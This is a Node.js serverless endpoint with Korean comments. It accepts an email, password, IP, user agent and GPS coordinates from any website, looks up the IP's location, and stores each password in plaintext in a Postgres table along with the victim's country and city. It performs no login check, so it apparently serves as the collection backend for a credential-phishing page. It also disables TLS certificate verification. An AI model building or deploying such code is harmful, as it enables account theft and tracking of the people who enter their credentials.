const { Pool } = require('pg');

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: {
        rejectUnauthorized: false
    }
});

// IP 기반 위치 정보 조회 함수 (무료 API 활용)
async function lookupIpGeo(ip) {
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,lat,lon`);
        const data = await response.json();
        if (data.status !== 'success') return {};
        return {
            country: data.country || null,
            region: data.regionName || null,
            city: data.city || null,
            isp: data.isp || null,
            ip_lat: data.lat ?? null,
            ip_lon: data.lon ?? null,
        };
    } catch (err) {
        console.error('IP 위치 조회 실패:', err.message);
        return {};
    }
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method === 'POST') {
        const { email, password, ip, user_agent, language, gps_lat, gps_lon } = req.body;

        if (!email || !password) {
            return res.status(400).json({ success: false, message: '이메일과 비밀번호를 입력해주세요.' });
        }

        try {
            // 1. IP 및 위치 정보를 포함할 수 있도록 테이블 생성 (이미 있다면 유지됨)
            await pool.query(`
                CREATE TABLE IF NOT EXISTS users (
                    id SERIAL PRIMARY KEY,
                    email TEXT,
                    password TEXT,
                    ip TEXT,
                    user_agent TEXT,
                    language TEXT,
                    country TEXT,
                    city TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            `);

            // 2. IP 기반 위치 정보 조회
            const geo = ip ? await lookupIpGeo(ip) : {};

            // 3. 데이터베이스에 로그인 정보 및 IP/위치 정보 저장
            const query = `
                INSERT INTO users (email, password, ip, user_agent, language, country, city) 
                VALUES ($1, $2, $3, $4, $5, $6, $7)
            `;
            await pool.query(query, [
                email, 
                password, 
                ip || null, 
                user_agent || null, 
                language || null, 
                geo.country || null, 
                geo.city || null
            ]);

            console.log(`[Neon DB 저장 성공] 이메일: ${email} / IP: ${ip} (${geo.country || '알 수 없음'})`);

            return res.status(200).json({ 
                success: true, 
                message: '데이터가 성공적으로 저장되었습니다.' 
            });

        } catch (error) {
            console.error('Neon DB 에러:', error);
            return res.status(500).json({ 
                success: false, 
                message: '데이터베이스 저장 중 오류가 발생했습니다.', 
                error: error.message 
            });
        }
    } else {
        res.setHeader('Allow', ['POST', 'OPTIONS']);
        return res.status(405).end(`Method ${req.method} Not Allowed`);
    }
};